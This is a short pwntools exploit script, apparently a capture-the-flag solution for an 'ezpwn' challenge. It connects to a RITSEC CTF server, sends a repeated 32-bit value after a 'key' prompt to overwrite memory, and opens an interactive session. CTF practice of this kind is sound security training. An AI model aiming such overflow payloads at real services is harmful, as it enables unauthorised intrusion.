from pwn import *

#r = process('./ezpwn')
context.log_level = 'debug'
r = remote('fun.ritsec.club', 8001)
r.sendlineafter('key', p32(1)*10)

r.interactive()
